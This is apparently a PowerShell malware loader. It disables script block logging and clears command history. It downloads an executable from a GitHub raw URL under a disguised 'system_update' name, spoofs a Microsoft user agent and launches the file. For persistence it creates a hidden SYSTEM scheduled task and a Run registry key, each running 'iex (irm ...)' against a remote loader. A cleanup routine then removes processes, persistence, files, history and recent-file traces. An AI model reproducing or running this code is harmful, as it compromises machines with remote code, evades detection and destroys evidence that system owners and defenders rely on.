function Invoke-SafeStealth {
    Write-Host "[+] Configuring stealth environment..." -ForegroundColor Yellow
    
    try {
        # Disable logging safely
        try {
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
        } catch {}
        
        # Clear command history safely
        try {
            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        } catch {}
        
        Write-Host "[✓] Stealth configured" -ForegroundColor Green
    } catch {
        Write-Host "[!] Stealth configuration partial" -ForegroundColor Yellow
    }
}

function Invoke-StableDownload {
    Write-Host "[+] Starting stable download..." -ForegroundColor Yellow
    
    $url = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
    $tempFile = $null
    
    try {
        # Create temp file path
        $tempFile = Join-Path $env:temp "system_update_$(Get-Date -Format 'yyyyMMdd_HHmmss').exe"
        Write-Host "[+] Download target: $tempFile" -ForegroundColor Gray
        
        # Download with retry logic
        $maxRetries = 3
        for ($i = 1; $i -le $maxRetries; $i++) {
            try {
                Write-Host "[+] Download attempt $i of $maxRetries..." -ForegroundColor Gray
                Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "Microsoft-CryptoAPI/10.0" -TimeoutSec 15
                
                if (Test-Path $tempFile) {
                    $fileSize = (Get-Item $tempFile).Length
                    if ($fileSize -gt 1024) {
                        Write-Host "[✓] Download successful: $fileSize bytes" -ForegroundColor Green
                        return $tempFile
                    } else {
                        Write-Host "[!] File too small: $fileSize bytes" -ForegroundColor Yellow
                        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                    }
                }
            } catch {
                Write-Host "[!] Download attempt $i failed: $($_.Exception.Message)" -ForegroundColor Yellow
                if ($i -eq $maxRetries) {
                    throw "All download attempts failed"
                }
                Start-Sleep -Seconds 2
            }
        }
        
        return $null
        
    } catch {
        Write-Host "[!] Download failed: $($_.Exception.Message)" -ForegroundColor Red
        if ($tempFile -and (Test-Path $tempFile)) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
        return $null
    }
}

function Start-ProtectedProcess {
    param([string]$FilePath)
    
    Write-Host "[+] Starting protected process..." -ForegroundColor Yellow
    
    try {
        # Validate file exists and is executable
        if (-not (Test-Path $FilePath)) {
            throw "File not found: $FilePath"
        }
        
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
            throw "Invalid executable format"
        }
        
        Write-Host "[✓] File validated: $($bytes.Length) bytes" -ForegroundColor Green
        
        # Start process with UI
        Write-Host "[+] Launching application with UI..." -ForegroundColor Gray
        $process = Start-Process -FilePath $FilePath -WindowStyle Normal -PassThru
        
        if (-not $process) {
            throw "Failed to start process"
        }
        
        Write-Host "[✓] Process started: PID $($process.Id)" -ForegroundColor Green
        
        # Monitor process without blocking
        $monitorJob = Start-Job -ScriptBlock {
            param($ProcessId)
            $process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
            $timeout = 300 # 5 minutes
            $startTime = Get-Date
            
            while ($process -and !$process.HasExited -and ((Get-Date) - $startTime).TotalSeconds -lt $timeout) {
                Start-Sleep -Seconds 5
                $process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
            }
            
            return @{
                Exited = ($process -eq $null -or $process.HasExited)
                TimedOut = ((Get-Date) - $startTime).TotalSeconds -ge $timeout
            }
        } -ArgumentList $process.Id
        
        # Continue execution while monitoring
        Write-Host "[+] Process monitoring started..." -ForegroundColor Gray
        return @{ Process = $process; Monitor = $monitorJob; FilePath = $FilePath }
        
    } catch {
        Write-Host "[!] Process start failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Set-SafePersistence {
    Write-Host "[+] Setting safe persistence..." -ForegroundColor Yellow
    
    try {
        $methods = @()
        
        # Scheduled Task
        try {
            $taskName = "\Microsoft\Windows\SystemDataUpdater"
            Write-Host "[+] Creating scheduled task: $taskName" -ForegroundColor Gray
            
            $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`""
            $taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:03:00"
            $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
            $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
            
            Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Windows System Data Update" -Force | Out-Null
            $methods += "Scheduled Task"
            Write-Host "[✓] Scheduled task created" -ForegroundColor Green
        } catch {
            Write-Host "[!] Scheduled task failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        
        # Registry
        try {
            $regName = "WindowsSystemUpdate"
            Write-Host "[+] Setting registry: $regName" -ForegroundColor Gray
            
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $regName -Value "powershell.exe -WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -ErrorAction SilentlyContinue
            $methods += "Registry"
            Write-Host "[✓] Registry entry set" -ForegroundColor Green
        } catch {
            Write-Host "[!] Registry failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        
        Write-Host "[✓] Persistence methods: $($methods -join ', ')" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Host "[!] Persistence setup failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Invoke-SafeCleanup {
    Write-Host "[=== SAFE CLEANUP MODE ===]" -ForegroundColor Yellow
    Write-Host "[!] Starting safe cleanup process..." -ForegroundColor Cyan
    
    # Phase 1: Process cleanup
    Write-Host "`n[PHASE 1] Process Cleanup" -ForegroundColor Green
    
    $targetProcesses = @("cmd", "explorerr", "runtime", "system_update")
    foreach ($procName in $targetProcesses) {
        try {
            $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
            foreach ($process in $processes) {
                Write-Host "[+] Stopping: $($process.ProcessName) (PID: $($process.Id))" -ForegroundColor Gray
                try {
                    $process.Kill()
                    Start-Sleep -Milliseconds 100
                    if ($process.HasExited) {
                        Write-Host "[✓] Stopped: $($process.ProcessName)" -ForegroundColor Green
                    }
                } catch {
                    Write-Host "[!] Failed to stop: $($process.ProcessName)" -ForegroundColor Yellow
                }
            }
        } catch {
            Write-Host "[!] Error processing: $procName" -ForegroundColor Red
        }
    }
    
    # Phase 2: Remove persistence
    Write-Host "`n[PHASE 2] Persistence Removal" -ForegroundColor Green
    
    # Remove scheduled task
    try {
        $taskName = "\Microsoft\Windows\SystemDataUpdater"
        if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
            Write-Host "[✓] Scheduled task removed" -ForegroundColor Green
        }
    } catch {
        Write-Host "[!] Failed to remove scheduled task" -ForegroundColor Yellow
    }
    
    # Remove registry
    try {
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemUpdate" -ErrorAction SilentlyContinue
        Write-Host "[✓] Registry entries removed" -ForegroundColor Green
    } catch {
        Write-Host "[!] Failed to remove registry entries" -ForegroundColor Yellow
    }
    
    # Phase 3: File cleanup
    Write-Host "`n[PHASE 3] File Cleanup" -ForegroundColor Green
    
    try {
        Get-ChildItem -Path $env:temp -Filter "system_update_*.exe" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Remove-Item $_.FullName -Force
                Write-Host "[✓] File removed: $($_.Name)" -ForegroundColor Green
            } catch {
                Write-Host "[!] Failed to remove: $($_.Name)" -ForegroundColor Yellow
            }
        }
    } catch {
        Write-Host "[!] File cleanup error" -ForegroundColor Red
    }
    
    # Phase 4: Evidence cleanup
    Write-Host "`n[PHASE 4] Evidence Cleanup" -ForegroundColor Green
    
    try {
        # Clear PowerShell history
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        Clear-History -ErrorAction SilentlyContinue
        Write-Host "[✓] PowerShell history cleared" -ForegroundColor Green
    } catch {
        Write-Host "[!] Failed to clear history" -ForegroundColor Yellow
    }
    
    try {
        # Clear recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        Write-Host "[✓] Recent files cleared" -ForegroundColor Green
    } catch {
        Write-Host "[!] Failed to clear recent files" -ForegroundColor Yellow
    }
    
    Write-Host "`n[=== SAFE CLEANUP COMPLETE ===]" -ForegroundColor Green
    Write-Host "[✓] All cleanup operations finished" -ForegroundColor Green
    Write-Host "[✓] System returned to clean state" -ForegroundColor Green
}
